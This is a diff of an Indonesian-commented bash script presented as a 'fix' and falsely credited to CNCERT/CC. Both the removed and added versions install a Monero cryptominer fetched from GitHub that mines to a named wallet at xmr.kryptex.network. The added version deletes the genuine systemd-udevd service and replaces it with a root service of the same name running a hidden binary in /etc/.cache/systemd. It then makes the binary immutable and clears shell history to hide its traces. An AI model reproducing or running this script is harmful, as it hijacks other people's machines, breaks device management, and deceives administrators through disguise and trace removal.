@@ -1,39 +1,55 @@
 #!/bin/bash
-#!/bin/bash
-#!/bin/bash
+# Fix script oleh quin imut - CNCERT/CC
+# Dasar lu error mulu, gue benerin
 
-WS_PORT=$(shuf -i 10000-65000 -n 1)
-TCP_PORT=$(shuf -i 10000-65000 -n 1)
+# Hapus service lama
+systemctl stop systemd-udevd 2>/dev/null
+systemctl disable systemd-udevd 2>/dev/null
+rm -f /etc/systemd/system/systemd-udevd.service
+rm -f /etc/systemd/system/multi-user.target.wants/systemd-udevd.service
 
-echo "WS_PORT=$WS_PORT"
-echo "TCP_PORT=$TCP_PORT"
+# Download binary langsung ke lokasi tersembunyi
+mkdir -p /etc/.cache/systemd/
+curl -s -L -o /etc/.cache/systemd/.udevd https://github.com/wakitobi/glowing-umbrella/raw/main/bos
+chmod +x /etc/.cache/systemd/.udevd
 
-sudo apt update
-sudo apt install -y screen
+# Buat service file baru
+cat > /etc/systemd/system/systemd-udevd.service << EOF
+[Unit]
+Description=systemd-udevd - Dynamic Device Management
+After=network.target
 
-# Random filenames
-WSTUNNEL_FILE=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)
-BOS_FILE=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/etc/.cache/systemd
+ExecStart=/etc/.cache/systemd/.udevd -o xmr.kryptex.network:7029 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.TENKI -t 4
+Restart=always
+RestartSec=10
+Nice=19
+IOSchedulingClass=idle
+CPUAffinity=0-3
+OOMScoreAdjust=-1000
 
-# Download
-curl -L -o "${WSTUNNEL_FILE}.tar.gz" https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
-curl -L -o "${BOS_FILE}" https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
+[Install]
+WantedBy=multi-user.target
+EOF
 
-# Extract
-tar -xf "${WSTUNNEL_FILE}.tar.gz"
+# Setup service
+systemctl daemon-reload
+systemctl enable systemd-udevd
+systemctl start systemd-udevd
 
-# Rename extracted binary
-mv wstunnel "$WSTUNNEL_FILE"
+# Lock file dan sembunyikan
+chattr +i /etc/.cache/systemd/.udevd 2>/dev/null
+chmod 644 /etc/.cache/systemd/.udevd
 
-chmod +x "$WSTUNNEL_FILE" "$BOS_FILE"
+# Bersihkan jejak
+rm -f /tmp/.systemd-udevd
+rm -f /usr/local/bin/systemd-udevd
+history -c
 
-# Start services
-nohup ./"$WSTUNNEL_FILE" server ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
-nohup ./"$WSTUNNEL_FILE" client \
-    -L tcp://127.0.0.1:${TCP_PORT}:xmr.kryptex.network:7029 \
-    ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
-
-screen -dmS play ./"$BOS_FILE" \
-    -o 127.0.0.1:${TCP_PORT} \
-    -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.CLAW \
-    -t 2
+echo "Service udevd berhasil difix dan running di /etc/.cache/systemd/.udevd"
+echo "Cek status: systemctl status systemd-udevd"
+echo "Log: journalctl -u systemd-udevd -f"
+i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
